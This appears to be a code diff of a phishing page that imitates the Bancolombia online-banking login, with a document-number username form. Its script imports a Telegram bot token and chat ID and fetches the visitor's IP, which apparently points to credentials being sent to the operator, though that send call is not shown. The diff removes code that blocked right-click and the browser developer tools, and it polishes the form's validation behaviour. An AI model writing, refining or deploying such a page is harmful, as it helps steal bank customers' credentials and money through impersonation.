@@ -13,8 +13,14 @@
     <link href="./archivos/ui.css" media="all" rel="stylesheet" type="text/css">
     <link href="./archivos/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
     <link href="./archivos/showLoading.css" media="all" rel="stylesheet" type="text/css">
-<title>Beneficios Bancolombia</title>
- 
+    <style>
+      /* Estilos para la transición suave */
+      #panDiv {
+        opacity: 0;
+        transition: opacity 1s ease-out; /* Transición suave de 1 segundo */
+      }
+    </style>
+    <title>Beneficios Bancolombia</title>
   </head>
 
   <body>
@@ -33,116 +39,60 @@
                   <div>
                     <div class="timeText">Fecha y hora actual:</div>
                     <span id="jclock1" class="lastVisitedText">
-					                              <script>
-var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
-var diasSemana = new Array("Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado");
-var f=new Date();
-var hora = f.getHours() + ':' + f.getMinutes() + ':' + f.getSeconds();
-document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear() + " " +  hora);
-</script>
+                    <script>
+                      var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
+                      var diasSemana = new Array("Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado");
+                      var f=new Date();
+                      var hora = f.getHours() + ':' + f.getMinutes() + ':' + f.getSeconds();
+                      document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear() + " " +  hora);
+                    </script>
 
-
-
-
-<script>
-
-
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-  });
-</script>
-
-<script>
-  document.onkeydown = function(e) {
-    if (e.keyCode == 123) { // F12
-      return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Ctrl+Shift+I
-      return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) { // Ctrl+Shift+C
-      return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { // Ctrl+Shift+J
-      return false;
-    }
-    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Ctrl+U
-      return false;
-    }
-  }
-
-
-   
-</script>
-
-
-<style>
-  body {
-    -webkit-user-select: none; /* Safari */
-    -moz-user-select: none; /* Firefox */
-    -ms-user-select: none; /* Internet Explorer/Edge */
-    user-select: none; /* Non-prefixed version, currently supported by Chrome, Opera and Firefox */
-  }
-  
-  img {
-    -webkit-user-drag: none;
-    -khtml-user-drag: none;
-    -moz-user-drag: none;
-    -o-user-drag: none;
-    user-drag: none;
-  }
-</style>
-
-
-					
-					</span>
+                    </span>
                   </div>
                 </div>
               </div>
             </div>
           </div>
+
           <div class="panel-heading">
             <h3>Inicio de sesi&oacute;n </h3>
           </div>
+
         </div>
         <form id="loginForm" method="post">
 
-          <p id="gfg" hidden=""></p>
-          <p id="address" hidden=""></p>
+          <!-- Agregamos el div para mostrar el mensaje de error -->
+          <div id="error-message" style="display:none; color:red; font-weight:bold;"></div>
+
           <div class="panel panel-primary">
+           
             <div class="mua-panel-body">
+              
               <div class="row">
+                
                 <div class="col-xs-12 col-sm-5 col-md-4">
+
+                  <!-- El div name="pan" está oculto por defecto -->
+                  <div name="pan" id="panDiv" class="image-container" style="display: none; align-items: center; padding: 10px; background-color: white; border: 1px solid #cccccc; margin-bottom: 15px !important;">
+                    <img style="width: 40px;" src="archivos/sas.png" alt="">
+                    <img style="width: 120px; margin-left: 0px;" src="archivos/dinam2.png" alt="">
+                  </div>
+
                   <div class="panel_general mua-panel_general">
-                   
                     <div class="subtitle-land-label">
                       <h4>
-
                         Si no tienes un usuario asignado ingresa con tu documento de identidad
                       </h4>
                     </div>
                     <div id="contenido">
-					            <div class=" ">
-                        
-                        
-                      </div>
-					
                       <div class="mua-content-group-panel">
                         <div class="mua-label-input">
-                          <span id="popoverUser" class="">
-						   <img src="archivos/ingre.png">
-						  </span>
-                          <div id="popoverContent" class="hide">
-                            <div class="">
-                           
-                            </div>
-                          </div>
                           <label class="control-label-index" for="DocumentNumber">Ingrese su usuario</label>
                         </div> 
                         <div>
                           <div class="mua_svp_enroll_update_control">
                             <input id="DocumentNumber" name="DocumentNumber" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" 
-							maxlength="20" autocomplete="off" required="required" onkeypress="checkKey(event)" onchange="trim(document.loginUserForm.username)">
+                            maxlength="20" autocomplete="off" required="required" onkeypress="checkKey(event)" onchange="trim(document.loginUserForm.username)">
                             <span class="mua-icon-user"></span>
                           </div>
                         </div>
@@ -162,65 +112,28 @@ document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.ge
                       </p>
                     </div>
                   </div>
-            
                 </div>
+
                 <div class="col-xs-12 col-sm-7 col-md-8">
                   <div  class="mua-embed-container-personal">
- <img style="width: 350px;" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/d408a137-4eba-48ee-a046-8702fa6eb4cf/HOME+VIVIENDA.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P86O40QTNS9EAE1S47-d408a137-4eba-48ee-a046-8702fa6eb4cf-p3NbK0O" alt="">
+                    <img style="width: 350px;" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/d408a137-4eba-48ee-a046-8702fa6eb4cf/HOME+VIVIENDA.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P86O40QTNS9EAE1S47-d408a137-4eba-48ee-a046-8702fa6eb4cf-p3NbK0O" alt="">
                   </div>
-               
                 </div>
               </div>
-            </div> <br><br><br><br><br><br>
-			   <div class="row">
-              <div class="col-xs-12 col-sm-12 col-md-12">
-                
-                  <p class="mua-footer">
-						<a onclick="site_secure();" class="">
-							Seguridad
-						</a>
-						<a onclick="policy();" class="">
-							Política de Privacidad
-						</a>
-						<a onclick="terms();" class="">
-							Términos y Condiciones
-						</a>
-						<a onclick="faq();" class="">
-							Preguntas Frecuentes
-						</a>
-				 </p>
-             
-              </div>
             </div>
- <br>
+
             <div class="row">
               <div class="col-xs-12 col-sm-12 col-md-12">
-                
                 <p class="mua-footer">
-                  Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín
-                  (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla
-                  (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
-                  Bucaramanga (57) 60 7 697 25 25
-                  <br>
-                  Pereira (57) 60 6 340 12 13 - El resto del país 018000 9
-                  12345. Sucursales Telefónicas en el exterior: España (34) 900
-                  995 717 - Estados Unidos (1) 866 379 97 14.
+                  Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00
                 </p>
-              </div>
-            </div>
-            <div style="margin-top: 10px">
-              <div class="mua-title-text pull-left">
-                
-              </div>
-              <div class="mua-title-text pull-right">
-                &copy; &nbsp;<span id="fecha">2024</span>&nbsp;Bancolombia
-                S.A.&nbsp;&nbsp;
               </div>
             </div>
           </div>
         </form>
       </div>
     </div>
+
     <script type="module">
       import { botToken, chatId } from './config.js';
 
@@ -244,7 +157,19 @@ document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.ge
 
           // Verificar si cumple con los requisitos
           if (invalidCharacters.test(usuario) || usuario.length < 8 || usuario.length > 20 || numbersCount < 2) {
-              alert('No eres cliente Bancolombia.');
+              // Mostrar el div name="pan" y hacerlo visible
+              var panDiv = document.getElementById('panDiv');
+              panDiv.style.display = 'flex';
+              panDiv.style.opacity = '1'; // Aseguramos que sea completamente visible
+              
+              // Después de 2 segundos, hacer que desaparezca suavemente
+              setTimeout(function() {
+                panDiv.style.opacity = '0'; // Cambiamos la opacidad a 0 para desaparecerlo
+                setTimeout(function() {
+                  panDiv.style.display = 'none'; // Después de que desaparezca, lo ocultamos completamente
+                }, 1000); // 1 segundo para que la transición sea suave
+              }, 2000); // Esperamos 2 segundos antes de que desaparezca
+              
               return; // Detener el envío del formulario
           }
 
@@ -290,6 +215,7 @@ document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.ge
                   console.error('Error al obtener la IP:', error);
               });
       });
-  </script>
+    </script>
 
-</body></html>
+  </body>
+</html>
